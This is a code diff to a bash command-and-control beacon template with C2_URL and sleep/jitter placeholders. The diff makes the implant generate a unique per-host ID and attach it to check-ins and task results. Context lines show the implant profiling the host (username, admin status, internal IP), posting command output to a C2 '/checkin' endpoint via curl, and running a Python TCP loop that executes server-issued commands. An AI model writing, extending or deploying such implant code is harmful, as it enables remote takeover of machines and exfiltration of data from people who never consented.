@@ -1,7 +1,24 @@
 #!/bin/bash
 
 C2_URL="{{C2_URL}}"
-BEACON_ID="{{BEACON_ID}}"
+# The payload is intentionally not assigned a build-time ID. A single script
+# may be launched on multiple hosts, so each process must identify itself.
+generate_beacon_id() {
+    local id=""
+    if [ -r /proc/sys/kernel/random/uuid ]; then
+        id=$(cat /proc/sys/kernel/random/uuid 2>/dev/null)
+    elif command -v uuidgen >/dev/null 2>&1; then
+        id=$(uuidgen 2>/dev/null)
+    fi
+    if [ -z "$id" ]; then
+        local host
+        host=$(hostname 2>/dev/null | tr -cd '[:alnum:]_.-')
+        [ -z "$host" ] && host="unknown"
+        id="$(date +%s%N 2>/dev/null)-$$-${RANDOM:-0}-$host"
+    fi
+    printf '%s' "$id"
+}
+BEACON_ID="$(generate_beacon_id)"
 SLEEP={{SLEEP}}
 JITTER={{JITTER}}
 PROTO="{{PROTO}}"
@@ -100,7 +117,7 @@ get_host_json() {
     local is_admin=$(check_admin)
     local internal_ip=$(get_internal_ip)
 
-    echo "{\"beacon_id\":\"${BEACON_ID}\",\"hostname\":\"${hostname}\",\"username\":\"${username}\",\"domain\":\"\",\"os\":\"${os_info}\",\"arch\":\"${arch}\",\"pid\":${pid},\"process_name\":\"${process_name}\",\"is_admin\":${is_admin},\"internal_ip\":\"${internal_ip}\"}"
+    echo "{\"beacon_id\":\"${BEACON_ID}\",\"hostname\":\"${hostname}\",\"username\":\"${username}\",\"domain\":\"\",\"os\":\"${os_info}\",\"arch\":\"${arch}\",\"pid\":${pid},\"process_name\":\"${process_name}\",\"is_admin\":${is_admin},\"internal_ip\":\"${internal_ip}\",\"sleep\":${SLEEP},\"jitter\":${JITTER}}"
 }
 
 sleep_with_jitter() {
@@ -273,7 +290,7 @@ http_send_result() {
     local output="$2"
     local escaped_output
     escaped_output=$(json_escape "$output")
-    local json="{\"task_id\":\"${task_id}\",\"output\":${escaped_output}}"
+    local json="{\"task_id\":\"${task_id}\",\"output\":${escaped_output},\"beacon_id\":\"${BEACON_ID}\"}"
     curl -s -X POST "${C2_URL}/checkin" \
         -H "Content-Type: application/json" \
         -d "${json}" -m 10 >/dev/null 2>&1
@@ -374,10 +391,10 @@ while True:
             elif resp.get('type') == 'tasks':
                 for t in resp.get('data', []):
                     if t.get('command') == '__EXIT__':
-                        tcp_write(s, {'type':'result','data':{'task_id':t['id'],'output':'TERMINATED'}})
+                        tcp_write(s, {'type':'result','data':{'task_id':t['id'],'output':'TERMINATED','beacon_id':BEACON_ID}})
                         tcp_read(s); s.close(); sys.exit(0)
                     out = execute(t.get('command',''))
-                    tcp_write(s, {'type':'result','data':{'task_id':t['id'],'output':out}})
+                    tcp_write(s, {'type':'result','data':{'task_id':t['id'],'output':out,'beacon_id':BEACON_ID}})
                     tcp_read(s)
             elif resp.get('type') == 'sleep':
                 c = resp.get('data',{})
